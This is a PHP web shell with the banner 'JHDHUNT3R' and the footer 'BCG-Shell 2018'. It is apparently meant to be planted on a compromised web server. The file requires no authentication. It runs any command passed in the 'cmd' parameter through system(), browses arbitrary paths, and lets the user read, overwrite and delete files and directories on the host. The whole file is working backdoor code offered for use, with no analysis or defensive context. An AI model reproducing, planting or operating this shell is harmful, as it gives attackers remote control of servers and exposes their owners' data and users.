<?php

echo '<!DOCTYPE HTML>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3pro.css">
<title>Success!:D</title>
<style>
h1{
    margin-top: 30px;
    text-align: center;
    color: red;
    text-shadow: 0 0 0.5em green, 0 0 0.5em green;
}
body{
font-family: "road rage", cursive;
background-color: #808080;
color:black;
}
#content tr:hover{
background-color: aqua;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: aqua;
}
table{
border: 1px #000000 dotted;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
textarea{
border: 1px red solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
select{
border: 1px red solid;
background-color:red;
color:white;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
input{
	border: 1px red solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
background-color:#808080;
}
.new{
	color:green;
	border: 1px #000000 dotted;
}
</style>
</head>
<body>
<h1><center>JHDHUNT3R</center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="cyan">Path :</font>';
echo "[ <a href='?'><font color='pink'>HOME</font></a> ] ";
if (isset($_GET['path'])) {
    $path = $_GET['path'];
} else {
    $path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo ' <a href ="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo ' <a href ="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr> <td>';
echo '<FORM METHOD ="GET" name="myform" action=""> <font color ="aqua" >CMDExect: </font><input type="text" name="cmd"> <input type="submit" value="Send"></form>';
if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }
if(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo ' < / table > <br/> <center>'.$_POST['path'].'<br/><br/> ';
if($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo ' <font color = "green"> FileEditedSuccessful </font><br/>';
}else{
echo ' <font color = "red"> FailedToEditFile </font><br/> ';
}
fclose($fp);
}
echo ' <form method = "POST"> <textarea cols =80 rows =20 name ="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea> <br/><input type ="hidden" name ="path" value ="'.$_POST['path'].'"><input type ="hidden" name ="opt" value ="edit"> <input type="submit" value="Save"/> </form>';
}
echo ' </center>';
}else{
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo ' < fontcolor = "green" > DirectoryErased < / font > < br / > ';
}else{
echo ' < fontcolor = "red" > FailedtoDeleteDirectory < / font > < br / > ';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo ' < fontcolor = "green" > FileErased < / font > < br / > ';
}else{
echo ' < fontcolor = "red" > FileFailedtoDelete, becauseforgettingissick < / font > < br / > ';
}
}
}
echo ' </table> <br/> <center> ';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';
            foreach ($scandir as $dir) {
                if (!is_dir($path . '/' . $dir) || $dir == '.' || $dir == '..') continue;
                echo '<tr>
<td><a href="?path=' . $path . '/' . $dir . '">' . $dir . '</a></td>
<td><center>--</center></td>
<td><center>';
                if (is_writable($path . '/' . $dir)) echo '<font color="green">';
                elseif (!is_readable($path . '/' . $dir)) echo '<font color="red">';
                echo perms($path . '/' . $dir);
                if (is_writable($path . '/' . $dir) || !is_readable($path . '/' . $dir)) echo '</font>';
                echo '</center></td>
<td><center><form method="POST" action="?option&path=' . $path . '">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="' . $dir . '">
<input type="hidden" name="path" value="' . $path . '/' . $dir . '">
<input type="submit" value=">">
</form></center></td>
</tr>';
            }
            echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
            foreach ($scandir as $file) {
                if (!is_file($path . '/' . $file)) continue;
                $size = filesize($path . '/' . $file) / 1024;
                $size = round($size, 3);
                if ($size >= 1024) {
                    $size = round($size / 1024, 2) . ' MB';
                } else {
                    $size = $size . ' KB';
                }
                echo '<tr>
<td><a href="?filesrc=' . $path . '/' . $file . '&path=' . $path . '">' . $file . '</a></td>
<td><center>' . $size . '</center></td>
<td><center>';
                if (is_writable($path . '/' . $file)) echo '<font color="green">';
                elseif (!is_readable($path . '/' . $file)) echo '<font color="red">';
                echo perms($path . '/' . $file);
                if (is_writable($path . '/' . $file) || !is_readable($path . '/' . $file)) echo '</font>';
                echo '</center></td>
<td><center><form method="POST" action="?option&path=' . $path . '">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="' . $file . '">
<input type="hidden" name="path" value="' . $path . '/' . $file . '">
<input type="submit" value=">">
</form></center></td>
</tr>';
            }
            echo '</table>
</div>';
        }
        echo '<center><br/><font color="cyan">BCG-Shell 2018.</center>
</body>
</html>';
        function perms($file) {
            $perms = fileperms($file);
            if (($perms & 0xC000) == 0xC000) {
                // Socket
                $info = 's';
            } elseif (($perms & 0xA000) == 0xA000) {
                // Symbolic Link
                $info = 'l';
            } elseif (($perms & 0x8000) == 0x8000) {
                // Regular
                $info = '-';
            } elseif (($perms & 0x6000) == 0x6000) {
                // Block special
                $info = 'b';
            } elseif (($perms & 0x4000) == 0x4000) {
                // Directory
                $info = 'd';
            } elseif (($perms & 0x2000) == 0x2000) {
                // Character special
                $info = 'c';
            } elseif (($perms & 0x1000) == 0x1000) {
                // FIFO pipe
                $info = 'p';
            } else {
                // Unknown
                $info = 'u';
            }
            // Owner
            $info.= (($perms & 0x0100) ? 'r' : '-');
            $info.= (($perms & 0x0080) ? 'w' : '-');
            $info.= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
            // Group
            $info.= (($perms & 0x0020) ? 'r' : '-');
            $info.= (($perms & 0x0010) ? 'w' : '-');
            $info.= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
            // World
            $info.= (($perms & 0x0004) ? 'r' : '-');
            $info.= (($perms & 0x0002) ? 'w' : '-');
            $info.= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
            return $info;
        }
?>
